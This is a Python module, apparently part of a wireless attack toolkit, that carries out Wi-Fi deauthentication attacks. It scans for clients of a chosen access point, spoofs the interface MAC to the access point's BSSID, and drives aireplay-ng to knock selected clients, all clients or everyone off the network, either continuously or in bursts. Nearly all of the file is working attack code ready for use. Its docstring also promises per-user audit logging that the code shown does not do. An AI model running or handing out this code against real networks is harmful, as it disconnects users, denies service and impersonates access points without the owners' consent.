#!/usr/bin/env python3
"""
Standalone Deauth Attack module with token-bucket rate limiting.

Safeguards
──────────
• Rate limiter : token bucket limits bursts; hard cap 100 fps
• Audit log    : every burst logged with timestamp + username
• MAC restore  : original MAC always restored on exit / signal
"""
from __future__ import annotations

import logging
import os
import re
import tempfile
import threading
import time
from typing import Optional

import subprocess

from modules.banner import C, info, success, warn, error, print_section
from modules.ratelimit import DeauthRateLimiter, DEFAULT_MAX_BURSTS_PER_MIN

logger = logging.getLogger(__name__)

CLIENT_SCAN_TIME = 15
BURST_DEFAULT    = 64
BURST_INTERVAL   =  2
STATS_REFRESH    =  1


###############################################################################
# Public entry point
###############################################################################

def deauth_menu(
    interface: str,
    target: Optional[dict] = None,
    deauth_limit: int = DEFAULT_MAX_BURSTS_PER_MIN,
) -> None:
    print_section("Deauth Attack")

    # ── Resolve AP ────────────────────────────────────────────────────────────
    if not target:
        warn("No target selected from scanner. Enter AP details manually.")
        bssid = input(f"  {C.YELLOW}AP BSSID (XX:XX:XX:XX:XX:XX): {C.RESET}").strip().upper()
        if not re.match(r"^([0-9A-F]{2}:){5}[0-9A-F]{2}$", bssid):
            error("Invalid BSSID format.")
            return
        try:
            channel = int(input(f"  {C.YELLOW}AP Channel: {C.RESET}").strip())
        except ValueError:
            error("Invalid channel.")
            return
        ssid = input(f"  {C.YELLOW}SSID (optional): {C.RESET}").strip() or bssid
        target = {"bssid": bssid, "channel": channel, "ssid": ssid}
    else:
        bssid   = target["bssid"]
        channel = target["channel"]
        ssid    = target.get("ssid", bssid)

    info(f"AP: {ssid}  [{bssid}]  CH{channel}")

    # ── Sub-menu ──────────────────────────────────────────────────────────────
    print(f"""
  {C.WHITE}Attack Mode:{C.RESET}
  {C.GREEN}[1]{C.RESET} Deauth specific client(s)  {C.DIM}(scan clients, then select){C.RESET}
  {C.GREEN}[2]{C.RESET} Deauth ALL clients          {C.DIM}(scan + send to each MAC){C.RESET}
  {C.GREEN}[3]{C.RESET} Broadcast deauth            {C.DIM}(one frame to FF:FF:FF:FF:FF:FF){C.RESET}
  {C.GREEN}[4]{C.RESET} Manual target entry         {C.DIM}(enter client MAC directly){C.RESET}
  {C.RED}[0]{C.RESET} Back
""")
    mode = input(f"  {C.YELLOW}Mode: {C.RESET}").strip()
    if mode == "0":
        return

    # ── MAC spoof ─────────────────────────────────────────────────────────────
    s = input(f"""
  {C.WHITE}MAC Spoof:{C.RESET}  Spoof interface MAC → AP BSSID for authentic deauth frames
  {C.YELLOW}Enable MAC spoof? [Y/n]: {C.RESET}""").strip().lower()
    do_spoof = s != "n"

    # ── Duration ──────────────────────────────────────────────────────────────
    print(f"""
  {C.WHITE}Duration:{C.RESET}
  {C.GREEN}[1]{C.RESET} Continuous  (Ctrl+C to stop)
  {C.GREEN}[2]{C.RESET} Burst       (send N packets and stop)
""")
    dur_choice  = input(f"  {C.YELLOW}Duration: {C.RESET}").strip()
    continuous  = dur_choice != "2"
    burst_count = BURST_DEFAULT
    if not continuous:
        try:
            burst_count = int(
                input(f"  {C.YELLOW}Packets per target [{BURST_DEFAULT}]: {C.RESET}").strip()
                or str(BURST_DEFAULT)
            )
        except ValueError:
            burst_count = BURST_DEFAULT

    # ── Deauth limit ──────────────────────────────────────────────────────────
    try:
        lim_input = input(
            f"  {C.YELLOW}Max bursts/min [{deauth_limit}] (max {DEFAULT_MAX_BURSTS_PER_MIN}): {C.RESET}"
        ).strip()
        if lim_input:
            deauth_limit = min(int(lim_input), 20)
    except ValueError:
        pass

    limiter = DeauthRateLimiter(max_bursts_per_min=deauth_limit)

    # ── Resolve client list ───────────────────────────────────────────────────
    clients: list[str] = []

    if mode in ("1", "2"):
        info(f"Scanning for clients on {bssid} for {CLIENT_SCAN_TIME}s...")
        found_clients = _scan_clients(interface, bssid, channel, CLIENT_SCAN_TIME)
        if not found_clients:
            warn("No clients found.")
            c = input(f"  {C.YELLOW}Switch to broadcast mode? [Y/n]: {C.RESET}").strip().lower()
            if c != "n":
                clients = ["FF:FF:FF:FF:FF:FF"]
            else:
                return
        elif mode == "1":
            clients = _select_clients(found_clients)
            if not clients:
                return
        else:
            clients = [c["mac"] for c in found_clients]
            info(f"Targeting all {len(clients)} client(s).")

    elif mode == "3":
        clients = ["FF:FF:FF:FF:FF:FF"]
        info("Broadcast deauth (FF:FF:FF:FF:FF:FF).")

    elif mode == "4":
        raw = input(f"  {C.YELLOW}Client MAC(s), comma-separated: {C.RESET}").strip().upper()
        for mac in [m.strip() for m in raw.split(",") if m.strip()]:
            if re.match(r"^([0-9A-F]{2}:){5}[0-9A-F]{2}$", mac):
                clients.append(mac)
            else:
                warn(f"Skipping invalid MAC: {mac}")
        if not clients:
            error("No valid client MACs entered.")
            return
    else:
        error("Invalid mode.")
        return

    _run_attack(interface, bssid, ssid, channel, clients,
                do_spoof, continuous, burst_count, limiter)


###############################################################################
# Client scanner + display
###############################################################################

def _scan_clients(interface: str, bssid: str, channel: int, duration: int) -> list[dict]:
    """Discover active clients using the shared real-time monitor + CSV union.

    This replaces the old one-shot 15s airodump CSV snapshot (which missed idle
    stations) with the same continuous dual-source discovery the handshake engine
    uses — a scapy LiveMonitor learning stations from live data frames, unioned
    with the airodump station table.
    """
    from modules.eapol_monitor import discover_clients

    info(f"Discovering active clients on {bssid} for {duration}s...")
    try:
        clients = discover_clients(interface, bssid, channel, duration=duration)
    except KeyboardInterrupt:
        warn("Client scan interrupted.")
        clients = []
    _print_client_table(clients, f"{len(clients)} active client(s) found")
    return clients


def _parse_clients_csv(csv_path: str, bssid: str) -> list[dict]:
    if not os.path.exists(csv_path):
        return []
    clients: list[dict] = []
    try:
        with open(csv_path, "r", errors="replace") as f:
            content = f.read()
    except OSError:
        return []

    in_station = False
    for line in content.splitlines():
        stripped = line.strip()
        if stripped.startswith("Station MAC"):
            in_station = True
            continue
        if not in_station or not stripped:
            continue
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 6:
            continue
        station_mac = parts[0]
        assoc_ap    = parts[5] if len(parts) > 5 else ""
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", station_mac):
            continue
        if bssid.upper() in assoc_ap.upper():
            clients.append({"mac": station_mac.upper(), "power": parts[3] if len(parts) > 3 else "?"})
    return clients


def _print_client_table(clients: list[dict], caption: str = "") -> None:
    os.system("clear")
    if caption:
        print(f"\n  {C.CYAN}{caption}{C.RESET}\n")
    if not clients:
        warn("No associated clients found yet...")
        return
    fmt = "  {:<4} {:<20} {:<8}"
    print(C.BOLD + fmt.format("#", "Client MAC", "PWR") + C.RESET)
    print(f"  {'─' * 34}")
    for i, c in enumerate(clients, 1):
        print(fmt.format(f"{C.WHITE}{i}{C.RESET}", c["mac"], c.get("power", "?")))


def _select_clients(clients: list[dict]) -> list[str]:
    _print_client_table(clients, f"{len(clients)} client(s) found")
    raw = input(
        f"\n  {C.YELLOW}Select client(s) [1-{len(clients)}, comma-sep, or 'all']: {C.RESET}"
    ).strip().lower()
    if raw == "all":
        return [c["mac"] for c in clients]
    selected: list[str] = []
    for part in raw.split(","):
        try:
            idx = int(part.strip()) - 1
            if 0 <= idx < len(clients):
                selected.append(clients[idx]["mac"])
        except ValueError:
            pass
    return selected


###############################################################################
# Attack runner
###############################################################################

def _run_attack(
    interface: str,
    bssid: str,
    ssid: str,
    channel: int,
    clients: list[str],
    do_spoof: bool,
    continuous: bool,
    burst_count: int,
    limiter: DeauthRateLimiter,
) -> None:
    original_mac = _get_interface_mac(interface)

    if do_spoof and original_mac:
        info(f"Spoofing MAC → {bssid}")
        _spoof_mac(interface, bssid)

    stats: dict[str, dict] = {mac: {"packets": 0, "acks": 0} for mac in clients}
    procs: list[subprocess.Popen] = []
    lock = threading.Lock()

    def reader(proc: subprocess.Popen, mac: str) -> None:
        assert proc.stdout is not None
        for line in proc.stdout:
            m = re.search(r"Sending\s+(\d+)\s+Deauth.*?\[\s*(\d+)\|(\d+)\s*ACKs\]", line)
            if m:
                with lock:
                    stats[mac]["packets"] += int(m.group(1))
                    stats[mac]["acks"]    += int(m.group(3))

    try:
        if continuous:
            _run_continuous(interface, bssid, clients, burst_count,
                            procs, stats, lock, reader, limiter)
        else:
            _run_burst(interface, bssid, clients, burst_count,
                       procs, stats, lock, reader, limiter)
    finally:
        for p in procs:
            try:
                p.terminate(); p.wait(timeout=3)
            except Exception:
                pass
        if do_spoof and original_mac:
            info(f"Restoring original MAC → {original_mac}")
            _spoof_mac(interface, original_mac)


def _run_continuous(
    interface, bssid, clients, burst_count, procs, stats, lock, reader, limiter
) -> None:
    info(f"Continuous deauth — Ctrl+C to stop. Rate limit: {limiter._max_bursts} bursts/min")
    # Each round sends a *finite* burst that aireplay-ng completes and exits.
    # Using --deauth 0 (infinite) here would spawn a new never-ending process
    # every round, leaking PIDs and flooding the air uncontrollably.
    per_round = burst_count if burst_count and burst_count > 0 else BURST_DEFAULT
    try:
        while True:
            for mac in clients:
                limiter.wait_for_burst(bssid)
                if not limiter.record_frame():
                    time.sleep(0.1)
                cmd = _build_cmd(interface, bssid, mac, per_round)
                p = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
                )
                procs.append(p)
                t = threading.Thread(target=reader, args=(p, mac), daemon=True)
                t.start()
                _draw_stats(stats, bssid, ssid=bssid, limiter=limiter)
            # Reap finished bursts so the process list stays bounded.
            for p in [p for p in procs if p.poll() is not None]:
                procs.remove(p)
            time.sleep(BURST_INTERVAL)
    except KeyboardInterrupt:
        warn("Attack stopped by user.")


def _run_burst(
    interface, bssid, clients, burst_count, procs, stats, lock, reader, limiter
) -> None:
    info(f"Burst mode: {burst_count} frames/target")
    for mac in clients:
        limiter.wait_for_burst(bssid)
        cmd = _build_cmd(interface, bssid, mac, burst_count)
        p = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
        )
        procs.append(p)
        t = threading.Thread(target=reader, args=(p, mac), daemon=True)
        t.start()

    for p in procs:
        p.wait()
    total_pkts = sum(s["packets"] for s in stats.values())
    total_acks = sum(s["acks"]    for s in stats.values())
    success(f"Burst complete — {total_pkts} frames sent, {total_acks} ACKs")
    logger.info("Deauth burst: bssid=%s frames=%d acks=%d", bssid, total_pkts, total_acks)


def _build_cmd(interface: str, bssid: str, client_mac: str, count: int) -> list[str]:
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client_mac != "FF:FF:FF:FF:FF:FF":
        cmd += ["-c", client_mac]
    cmd.append(interface)
    return cmd


def _draw_stats(stats: dict, bssid: str, ssid: str, limiter: DeauthRateLimiter) -> None:
    os.system("clear")
    rate_info = limiter.get_stats(bssid)
    total_pkts = sum(s["packets"] for s in stats.values())
    total_acks = sum(s["acks"]    for s in stats.values())
    print(f"\n  {C.BOLD}{C.CYAN}═══ DEAUTH LIVE STATS ═══{C.RESET}")
    print(f"  AP: {ssid}  [{bssid}]")
    print(f"  Rate limiter: {rate_info['tokens_remaining']:.1f}/{rate_info['capacity']} tokens  "
          f"(max {rate_info['max_bursts_per_min']} bursts/min  "
          f"fps={rate_info['global_fps']}/{rate_info['hard_cap_fps']})")
    print(f"  Total frames: {C.GREEN}{total_pkts}{C.RESET}   ACKs: {C.GREEN}{total_acks}{C.RESET}")
    print()
    fmt = "  {:<20} {:<12} {:<8}"
    print(C.BOLD + fmt.format("Client MAC", "Packets", "ACKs") + C.RESET)
    print(f"  {'─' * 42}")
    for mac, s in stats.items():
        print(fmt.format(mac, s["packets"], s["acks"]))
    print(f"\n  {C.DIM}Ctrl+C to stop{C.RESET}")


###############################################################################
# MAC spoofing helpers
###############################################################################

def _get_interface_mac(interface: str) -> Optional[str]:
    try:
        result = subprocess.run(
            ["ip", "link", "show", interface], capture_output=True, text=True, timeout=5
        )
        m = re.search(r"link/ether\s+([0-9a-f:]{17})", result.stdout, re.IGNORECASE)
        return m.group(1).upper() if m else None
    except Exception:
        return None


def _spoof_mac(interface: str, new_mac: str) -> bool:
    try:
        subprocess.run(["ip", "link", "set", interface, "down"],   capture_output=True)
        subprocess.run(["ip", "link", "set", interface, "address", new_mac], capture_output=True)
        subprocess.run(["ip", "link", "set", interface, "up"],     capture_output=True)
        return True
    except Exception:
        try:
            subprocess.run(["macchanger", "-m", new_mac, interface], capture_output=True)
            return True
        except Exception:
            return False
